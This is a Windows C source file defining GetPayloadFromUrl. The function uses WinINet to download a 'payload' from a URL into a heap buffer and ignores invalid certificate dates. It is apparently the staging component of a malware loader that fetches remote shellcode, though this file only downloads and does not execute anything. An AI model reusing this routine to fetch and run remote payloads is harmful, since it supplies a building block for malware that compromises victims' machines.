#include "glassBox.h"

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL bSTATE = TRUE;
	
	HINTERNET	hInternet = NULL,
				hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;


	SIZE_T		sSize = NULL; // Used as the total payload size
	PBYTE		pBytes = NULL; // Used as the total payload heap buffer
	PBYTE		pTmpBytes = NULL; // Used as the temp buffer of size 1024 bytes


	// Opening an internet session handle
	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		warn("InernetOpenW Failed With Error : %d\n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening a handle to the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		warn("InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}
	
	while (TRUE) {

		// Reading 1024 bytes to the temp buffer
		// InternetReadFile will read less bytes in case the final chunk is less than 1024 byte
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			warn("InternetReadFile Failed With Error : %d\n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Updating the size of the total buffer
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then locate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to eqeal to the total size, sSize
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Append the temp buffer to the end of the local buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise read next 1024 bytes
	}

	*pPayloadBytes = pBytes; // Pointer to the downloaded bytes
	*sPayloadSize = sSize; // Total size of the downloaded data

	// Clean Up
_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOption(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}
